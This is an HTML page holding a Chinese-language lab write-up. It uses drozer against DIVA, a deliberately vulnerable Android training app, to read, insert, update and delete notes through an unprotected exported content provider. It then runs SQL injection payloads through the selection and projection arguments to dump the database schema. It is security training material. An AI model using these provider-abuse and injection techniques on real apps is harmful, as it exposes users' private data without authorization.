<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Test DIVA - content provider exported - DB Based
  #

這一題是第11. Access Control Issues - Part 3，用意是要我們不需要PIN code就可以access儲存起來的notes

起手式
dz> run app.provider.info -a jakhar.aseem.diva
Attempting to run shell module
Package: jakhar.aseem.diva
  Authority: jakhar.aseem.diva.provider.notesprovider
    Read Permission: null
    Write Permission: null
    Content Provider: jakhar.aseem.diva.NotesProvider
    Multiprocess Allowed: False
    Grant Uri Permissions: False
    Uri Permission Patterns:
    Path Permissions:

dz> run scanner.provider.finduris -a jakhar.aseem.diva
Attempting to run shell module
Scanning jakhar.aseem.diva...
No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider/
Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes
No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider
Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes/

For sure accessible content URIs:
  content://jakhar.aseem.diva.provider.notesprovider/notes
  content://jakhar.aseem.diva.provider.notesprovider/notes/
從以上測試結果可以知道jakhar.aseem.diva.NotesProvider的狀況，以及對應的URI為何
逆向
從NotesProvider這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request
query/insert/update/delete/sqli

query
我們達到了一開始題目的要求，只需要直接query就好了
dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
Attempting to run shell module
  _id  5
title  Exercise
 note  Alternate days running

  _id  4
title  Expense
 note  Spent too much on home theater

  _id  6
title  Weekend
 note  b333333333333r

  _id  3
title  holiday
 note  Either Goa or Amsterdam

  _id  2
title  home
 note  Buy toys for baby, Order dinner

  _id  1
title  office
 note  10 Meetings. 5 Calls. Lunch with CEO

insert
dz> run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id 7 --string title pwn1 --string note pwnpwn1
Attempting to run shell module
Done.

dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
Attempting to run shell module
| _id | title    | note                                 |
| 5   | Exercise | Alternate days running               |
| 4   | Expense  | Spent too much on home theater       |
| 6   | Weekend  | b333333333333r                       |
| 3   | holiday  | Either Goa or Amsterdam              |
| 2   | home     | Buy toys for baby, Order dinner      |
| 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
| 7   | pwn1     | pwnpwn1                              |

update
dz> run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes  --selection "_id=?" --selectio
n-args 7 --string title pwn2 --string note pwnpwn2
Attempting to run shell module
Done.

dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
Attempting to run shell module
| _id | title    | note                                 |
| 5   | Exercise | Alternate days running               |
| 4   | Expense  | Spent too much on home theater       |
| 6   | Weekend  | b333333333333r                       |
| 3   | holiday  | Either Goa or Amsterdam              |
| 2   | home     | Buy toys for baby, Order dinner      |
| 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
| 7   | pwn2     | pwnpwn2                              |

delete
dz> run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selection
-args 7
Attempting to run shell module
Done.

dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
Attempting to run shell module
| _id | title    | note                                 |
| 5   | Exercise | Alternate days running               |
| 4   | Expense  | Spent too much on home theater       |
| 6   | Weekend  | b333333333333r                       |
| 3   | holiday  | Either Goa or Amsterdam              |
| 2   | home     | Buy toys for baby, Order dinner      |
| 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |

sqli
測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table
dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection "&#39;"
Attempting to run shell module
Exception occured: unrecognized token: "&#39;) ORDER BY title" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM notes WHERE (&#39;) ORDER BY title

dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type=&#39;table&#39;;--"
Attempting to run shell module
| type  | name             | tbl_name         | rootpage | sql                                                                                                 |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                         |
| table | notes            | notes            | 4        | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                                              |
也可以透過drozer自動找可能的點
dz> run scanner.provider.injection -a jakhar.aseem.diva
Attempting to run shell module
Scanning jakhar.aseem.diva...
Not Vulnerable:
  content://jakhar.aseem.diva.provider.notesprovider/
  content://jakhar.aseem.diva.provider.notesprovider

Injection in Projection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes

Injection in Selection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Attempting to run shell module
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
  android_metadata
  notes
  sqlite_sequence

Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes:
  android_metadata
  notes
  sqlite_sequence



'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Test DIVA - content provider exported - DB Based"><meta property="og:description" content='Test DIVA - content provider exported - DB Based # 這一題是第11. Access Control Issues - Part 3，用意是要我們不需要PIN code就可以access儲存起來的notes
起手式 dz> run app.provider.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Authority: jakhar.aseem.diva.provider.notesprovider Read Permission: null Write Permission: null Content Provider: jakhar.aseem.diva.NotesProvider Multiprocess Allowed: False Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz> run scanner.provider.finduris -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/ Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/ For sure accessible content URIs: content://jakhar.aseem.diva.provider.notesprovider/notes content://jakhar.aseem.diva.provider.notesprovider/notes/ 從以上測試結果可以知道jakhar.aseem.diva.NotesProvider的狀況，以及對應的URI為何 逆向 從NotesProvider這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request query/insert/update/delete/sqli query 我們達到了一開始題目的要求，只需要直接query就好了 dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical Attempting to run shell module _id 5 title Exercise note Alternate days running _id 4 title Expense note Spent too much on home theater _id 6 title Weekend note b333333333333r _id 3 title holiday note Either Goa or Amsterdam _id 2 title home note Buy toys for baby, Order dinner _id 1 title office note 10 Meetings. 5 Calls. Lunch with CEO insert dz> run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id 7 --string title pwn1 --string note pwnpwn1 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn1 | pwnpwn1 | update dz> run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selectio n-args 7 --string title pwn2 --string note pwnpwn2 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn2 | pwnpwn2 | delete dz> run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selection -args 7 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | sqli 測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection "&#39;" Attempting to run shell module Exception occured: unrecognized token: "&#39;) ORDER BY title" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM notes WHERE (&#39;) ORDER BY title dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type=&#39;table&#39;;--" Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) | | table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) | 也可以透過drozer自動找可能的點 dz> run scanner.provider.injection -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Not Vulnerable: content://jakhar.aseem.diva.provider.notesprovider/ content://jakhar.aseem.diva.provider.notesprovider Injection in Projection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes Injection in Selection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes dz> run scanner.provider.sqltables -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/: android_metadata notes sqlite_sequence Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes: android_metadata notes sqlite_sequence'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="tools"><meta property="article:tag" content="Android"><meta property="article:tag" content="Drozer"><title>Test DIVA - content provider exported - DB Based | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Test DIVA - content provider exported - DB Based</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents></nav></aside></header><article class="markdown book-article"><h1 id=test-diva---content-provider-exported---db-based>Test DIVA - content provider exported - DB Based
<a class=anchor href=#test-diva---content-provider-exported---db-based>#</a></h1><p>這一題是第<code>11. Access Control Issues - Part 3</code>，用意是要我們不需要PIN code就可以access儲存起來的notes</p><ol><li>起手式<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.info -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: jakhar.aseem.diva
</span></span><span style=display:flex><span>  Authority: jakhar.aseem.diva.provider.notesprovider
</span></span><span style=display:flex><span>    Read Permission: null
</span></span><span style=display:flex><span>    Write Permission: null
</span></span><span style=display:flex><span>    Content Provider: jakhar.aseem.diva.NotesProvider
</span></span><span style=display:flex><span>    Multiprocess Allowed: False
</span></span><span style=display:flex><span>    Grant Uri Permissions: False
</span></span><span style=display:flex><span>    Uri Permission Patterns:
</span></span><span style=display:flex><span>    Path Permissions:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.finduris -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning jakhar.aseem.diva...
</span></span><span style=display:flex><span>No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>No respone from content URI:      content://jakhar.aseem.diva.provider.notesprovider
</span></span><span style=display:flex><span>Got a response from content Uri:  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For sure accessible content URIs:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span></code></pre></div>從以上測試結果可以知道<code>jakhar.aseem.diva.NotesProvider</code>的狀況，以及對應的URI為何</li><li>逆向
從<code>NotesProvider</code>這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request</li><li>query/insert/update/delete/sqli<ul><li>query
我們達到了一開始題目的要求，只需要直接query就好了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>title  Exercise
</span></span><span style=display:flex><span> note  Alternate days running
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>title  Expense
</span></span><span style=display:flex><span> note  Spent too much on home theater
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span>title  Weekend
</span></span><span style=display:flex><span> note  b333333333333r
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>title  holiday
</span></span><span style=display:flex><span> note  Either Goa or Amsterdam
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>title  home
</span></span><span style=display:flex><span> note  Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>title  office
</span></span><span style=display:flex><span> note  <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO
</span></span></code></pre></div></li><li>insert<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id <span style=color:#ae81ff>7</span> --string title pwn1 --string note pwnpwn1
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>| _id | title    | note                                 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>5</span>   | Exercise | Alternate days running               |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>4</span>   | Expense  | Spent too much on home theater       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>6</span>   | Weekend  | b333333333333r                       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>   | holiday  | Either Goa or Amsterdam              |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>   | home     | Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner      |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>   | office   | <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>7</span>   | pwn1     | pwnpwn1                              |
</span></span></code></pre></div></li><li>update<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes  --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selectio
</span></span><span style=display:flex><span>n-args <span style=color:#ae81ff>7</span> --string title pwn2 --string note pwnpwn2
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>| _id | title    | note                                 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>5</span>   | Exercise | Alternate days running               |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>4</span>   | Expense  | Spent too much on home theater       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>6</span>   | Weekend  | b333333333333r                       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>   | holiday  | Either Goa or Amsterdam              |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>   | home     | Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner      |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>   | office   | <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>7</span>   | pwn2     | pwnpwn2                              |
</span></span></code></pre></div></li><li>delete<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selection
</span></span><span style=display:flex><span>-args <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>| _id | title    | note                                 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>5</span>   | Exercise | Alternate days running               |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>4</span>   | Expense  | Spent too much on home theater       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>6</span>   | Weekend  | b333333333333r                       |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>   | holiday  | Either Goa or Amsterdam              |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>   | home     | Buy toys <span style=color:#66d9ef>for</span> baby, Order dinner      |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>   | office   | <span style=color:#ae81ff>10</span> Meetings. <span style=color:#ae81ff>5</span> Calls. Lunch with CEO |
</span></span></code></pre></div></li><li>sqli
測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection <span style=color:#e6db74>&#34;&#39;&#34;</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Exception occured: unrecognized token: <span style=color:#e6db74>&#34;&#39;) ORDER BY title&#34;</span> <span style=color:#f92672>(</span>code <span style=color:#ae81ff>1</span> SQLITE_ERROR<span style=color:#f92672>)</span>: , <span style=color:#66d9ef>while</span> compiling: SELECT * FROM notes WHERE <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;) ORDER BY title
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>dz&gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection &#34;* FROM SQLITE_MASTER WHERE type=&#39;</span>table<span style=color:#960050;background-color:#1e0010>&#39;</span>;--<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Attempting to run shell module
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| type  | name             | tbl_name         | rootpage | sql                                                                                                 |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                         |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | notes            | notes            | 4        | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                                              |
</span></span></span></code></pre></div>也可以透過drozer自動找可能的點<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run scanner.provider.injection -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning jakhar.aseem.diva...
</span></span><span style=display:flex><span>Not Vulnerable:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Projection:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Selection:
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes/
</span></span><span style=display:flex><span>  content://jakhar.aseem.diva.provider.notesprovider/notes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.sqltables -a jakhar.aseem.diva
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning jakhar.aseem.diva...
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  notes
</span></span><span style=display:flex><span>  sqlite_sequence
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://jakhar.aseem.diva.provider.notesprovider/notes:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  notes
</span></span><span style=display:flex><span>  sqlite_sequence
</span></span></code></pre></div></li></ul></li></ol></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents></nav></div></aside></main></body></html>